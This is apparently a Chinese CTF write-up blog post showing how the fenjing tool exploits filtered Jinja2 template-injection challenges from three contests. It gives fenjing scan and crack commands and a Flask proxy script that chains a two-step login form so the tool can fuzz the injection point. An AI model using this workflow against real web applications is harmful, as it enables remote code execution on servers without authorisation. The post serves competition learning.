#  从国赛到西湖论剑：fenjing进阶通杀jinjia2_SSTI   
原创 Zacarx  Zacarx随笔   2025-01-20 09:58  
  
   
  
## 前言  
  
最近俩月比赛遇到了三个jinjia2_SSTI题目，发现其虽然有过滤，但是fenjing都可以对其过滤进行降维打击。可问题是fenjing不一定就能用得上，需要一些**改造思路**  
，下面我就结合这三次比赛带大家体会一下。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XLoEenAE7ATqoH2BhjFC8WPtibdS4BUYxnqr7U33vIfKoqm5o5ajhbvhSLuNAayvuq8mcmVOYkvDicaU1iaADkNmg/640?wx_fmt=png&from=appmsg "null")  
  
## 初级用法：一把梭  
### 春秋冬季赛day1:  
  
非常简单梭哈即可，具体工具用法直接去看：https://github.com/Marven11/Fenjing  
  
fenjing scan -u "http://47.94.155.240:28672/"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XLoEenAE7ATqoH2BhjFC8WPtibdS4BUYxlNoIzOe8Jia0hllnQQDMUCgYxcmbIpy8GPK0jKrGBSH4o3ROaBTjbRQ/640?wx_fmt=png&from=appmsg "null")  
  
## 如何进阶？  
  
**我们的思路就是二开或代理**  
，其分别对应有源码情况以及无源码情况；  
  
注意：**二开不是二开工具是二开题目，代理即帮助fenjing进行交互。**  
### 有源码：国赛  
  
题目来自于第十八届全国大学生信息安全竞赛 （创新实践能力赛）暨第二届“长城杯” 铁人三项赛（防护赛）初赛 Safe_Proxy  
  
这个题其实是无回显不出网有过滤的SSTI,但是有源码  
  
于是我们稍微改一下就变成了有回显不出网有过滤的SSTI  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XLoEenAE7ATqoH2BhjFC8WPtibdS4BUYxXvZHdoDd7bQQKATtjq0A4ZNYhE5ps6jvExt1kVD0nh0iaCPOhkU1zLQ/640?wx_fmt=png&from=appmsg "null")  
  
  
然后本地跑起来，fenjing一把锁得到payload，最后去打题目环境即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XLoEenAE7ATqoH2BhjFC8WPtibdS4BUYxk3NjZ0K4XKk8NV6lPGSmkyOCxEsETa3zNayCVSCWpyf8UiasMpS7BOQ/640?wx_fmt=png&from=appmsg "null")  
  
  
记得编码一下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XLoEenAE7ATqoH2BhjFC8WPtibdS4BUYxU20ZwicYia4ddx9X66rrcQuMhHibJpG14HeNYF9uycGPa7YAa3m4thAyQ/640?wx_fmt=png&from=appmsg "null")  
  
  
得到flag  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XLoEenAE7ATqoH2BhjFC8WPtibdS4BUYxu4Anxn2TPaS5tywk4hQjplZnGyfn8ibpS0aQatAPj8P7buSLHQkcdBQ/640?wx_fmt=png&from=appmsg "null")  
  
### 无源码：西湖论剑  
  
题目来自于前两天的2025西湖论剑  
  
前面没有截图简单说一下这个题目：  
  
就是第一个页面/login让你输入手机号phone_number=a，点击提交  
  
然后跳转第二个页面/cpass让你输入密码password=123456，再提交  
  
最后弹窗说"a不满足手机号格式"  
  
显然，注入点SSTI在phone_number，但是我们无法直接进行利用，原因在于无法把两次交互都放在fenjing上  
  
那么我们的思路也就有了：  
  
写一个本地python代理程序，访问localhost POST传入phone_number=&password=  
  
而这个程序帮我分别访问http://139.155.126.78:21317/login POST传入phone_number  
  
和http://139.155.126.78:21317/cpass POST传入password=12345678  
  
注意: http://139.155.126.78:21317/login会返回一些状态信息以保证与http://139.155.126.78:21317/cpass 对应  
  
那么写一个本地源码：  
```
from flask import Flask, request, Responseimport requestsapp = Flask(__name__)BASE_URL = "http://139.155.126.78:27325/"@app.route('/', methods=['POST'])defproxy():    phone_number = request.form.get('phone_number')    try:        login_response = requests.post(            f"{BASE_URL}/login",            data={"phone_number": phone_number},              timeout=10        )        if login_response.status_code != 200:            return Response(f"Failed to call /login. Status code: {login_response.status_code}", status=500)        login_status = login_response.text.strip()        cpass_response = requests.post(            f"{BASE_URL}/cpass",            data={"password": 123456789, "login_status": login_status},              timeout=10        )        if cpass_response.status_code != 200:            return Response(f"Failed to call /cpass. Status code: {cpass_response.status_code}", status=500)        cpass_result = cpass_response.text.strip()        response_data = f"Login response: {login_status}\nCpass response: {cpass_result}"        return Response(response_data, status=200)    except Exception as e:        return Response(f"An error occurred: {str(e)}", status=500)if __name__ == '__main__':    app.run(host="127.0.0.1", port=5000)
```  
  
然后fenjing梭哈  
```
fenjing crack -u "http://127.0.0.1:5000/" -i phone_number
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XLoEenAE7ATqoH2BhjFC8WPtibdS4BUYxN7JibMI4lrKMyF5nGpenXcqywOCMibts0cjluBXLYQE1Abib9CoibZdLFA/640?wx_fmt=png&from=appmsg "null")  
  
  
拿到payload:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XLoEenAE7ATqoH2BhjFC8WPtibdS4BUYxk2U9T7HgibTJnvnq7wBLOP5GOPomfzCnLZIXaic9QYeBaaxWbibqeOTKA/640?wx_fmt=png&from=appmsg "null")  
  
  
还有flag  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XLoEenAE7ATqoH2BhjFC8WPtibdS4BUYxztTvkW5g4CjX7gfaUVgqpicHLBnADRcJMMcSnY6ibNdSKFdAibuOOFk6Q/640?wx_fmt=png&from=appmsg "null")  
  
  
   
  
